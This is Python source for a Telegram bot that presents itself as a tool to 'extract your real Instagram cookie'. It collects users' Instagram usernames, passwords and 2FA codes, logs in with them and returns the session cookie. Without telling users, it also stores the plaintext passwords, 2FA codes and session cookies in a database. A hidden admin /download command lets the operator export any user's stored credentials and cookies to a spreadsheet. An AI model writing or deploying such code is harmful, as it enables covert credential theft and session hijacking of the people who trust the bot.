import os
import sqlite3
import re
from datetime import datetime
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from openpyxl import Workbook
import requests
from requests.cookies import RequestsCookieJar

# ---------- Configuration ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0"))

# Conversation states
USERNAME, PASSWORD, TFA = range(3)

# ---------- Database setup ----------
conn = sqlite3.connect("data.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tg_user_id INTEGER,
        instagram_username TEXT,
        instagram_password TEXT,
        tfa_key TEXT,
        cookie TEXT,
        timestamp TEXT
    )
""")
conn.commit()

def save_credentials(tg_user_id, username, password, tfa, cookie):
    timestamp = datetime.now().isoformat()
    cursor.execute(
        "INSERT INTO credentials (tg_user_id, instagram_username, instagram_password, tfa_key, cookie, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
        (tg_user_id, username, password, tfa, cookie, timestamp),
    )
    conn.commit()

def get_user_credentials(tg_user_id):
    cursor.execute(
        "SELECT instagram_username, instagram_password, tfa_key, timestamp, cookie FROM credentials WHERE tg_user_id = ? ORDER BY id",
        (tg_user_id,),
    )
    return cursor.fetchall()

# ---------- Instagram real login & cookie extraction ----------
def instagram_login(username, password, tfa_code=None):
    """
    Attempts to login to Instagram and returns a cookie string (like 'csrftoken=...; sessionid=...').
    Returns (success, cookie_string_or_error_message)
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/",
    })

    # Get CSRF token first
    try:
        resp = session.get("https://www.instagram.com/")
        csrf_token = None
        for cookie in session.cookies:
            if cookie.name == "csrftoken":
                csrf_token = cookie.value
                break
        if not csrf_token:
            match = re.search(r'csrf_token":"([^"]+)"', resp.text)
            if match:
                csrf_token = match.group(1)
        if not csrf_token:
            return False, "Could not retrieve CSRF token."
    except Exception as e:
        return False, f"Connection error: {str(e)}"

    # Login payload
    login_url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false",
    }
    session.headers.update({"X-CSRFToken": csrf_token})
    
    try:
        response = session.post(login_url, data=payload)
        data = response.json()
        
        if data.get("authenticated"):
            # Login successful
            cookie_dict = session.cookies.get_dict()
            cookie_string = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
            return True, cookie_string
        elif data.get("two_factor_required"):
            # 2FA needed
            if not tfa_code:
                return False, "2FA required but no code provided."
            two_factor_url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/two_factor/"
            tf_payload = {
                "username": username,
                "verificationCode": tfa_code,
                "two_factor_identifier": data["two_factor_info"]["two_factor_identifier"],
            }
            resp2 = session.post(two_factor_url, data=tf_payload)
            data2 = resp2.json()
            if data2.get("authenticated"):
                cookie_dict = session.cookies.get_dict()
                cookie_string = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
                return True, cookie_string
            else:
                return False, f"2FA failed: {data2.get('message', 'Unknown error')}"
        else:
            return False, f"Login failed: {data.get('message', 'Check username/password')}"
    except Exception as e:
        return False, f"Exception during login: {str(e)}"

# ---------- Telegram handlers ----------
async def send_welcome_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🍪 extract Cookie", callback_data="extract_cookie")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Welcome! Click below to extract your **real Instagram cookie**.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def start_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Please send your Instagram username:")
    return USERNAME

async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["ig_username"] = update.message.text
    await update.message.reply_text("Now send your Instagram password:")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["ig_password"] = update.message.text
    await update.message.reply_text("Finally, send your 2FA key (if none, send 0):")
    return TFA

async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tfa_raw = update.message.text.strip()
    tfa_code = None if tfa_raw == "0" else tfa_raw
    username = context.user_data["ig_username"]
    password = context.user_data["ig_password"]
    tg_user_id = update.effective_user.id

    await update.message.reply_text("⏳ Logging into Instagram, please wait...")

    # Perform real login
    success, result = instagram_login(username, password, tfa_code)
    
    if not success:
        await update.message.reply_text(f"❌ Login failed:\n{result}\nPlease try again with /start")
        context.user_data.clear()
        return ConversationHandler.END

    cookie_string = result  # contains full cookie like csrftoken=...; sessionid=...
    
    # Save credentials and cookie to database
    save_credentials(tg_user_id, username, password, (tfa_code or "None"), cookie_string)
    
    # Send the real cookie as a text message
    await update.message.reply_text(
        f"✅ Login successful! Here is your Instagram cookie:\n\n`{cookie_string}`\n\n(Do not share this with anyone)",
        parse_mode="Markdown"
    )
    
    # Clear data and restart welcome message
    context.user_data.clear()
    await send_welcome_message(update, context)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation cancelled. Use /start to begin again.")
    context.user_data.clear()
    return ConversationHandler.END

# ---------- Admin command ----------
async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /download <telegram_user_id>")
        return
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("User ID must be an integer.")
        return

    rows = get_user_credentials(target_user_id)
    if not rows:
        await update.message.reply_text(f"No data for user {target_user_id}.")
        return

    wb = Workbook()
    ws = wb.active
    ws.title = "Instagram Data"
    ws.append(["Username", "Password", "2FA Key", "Timestamp", "Cookie"])

    for row in rows:
        ws.append(list(row))

    excel_buffer = BytesIO()
    wb.save(excel_buffer)
    excel_buffer.seek(0)

    await update.message.reply_document(
        document=excel_buffer,
        filename=f"user_{target_user_id}_insta_data.xlsx",
        caption=f"Full data for user {target_user_id} (including cookies)",
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_welcome_message(update, context)

# ---------- Main ----------
def main():
    if not BOT_TOKEN:
        raise ValueError("Missing BOT_TOKEN")
    if ADMIN_CHAT_ID == 0:
        print("Warning: ADMIN_CHAT_ID not set")

    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_extract, pattern="^extract_cookie$")],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tfa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("download", download_command))

    print("Bot is running with REAL Instagram login...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
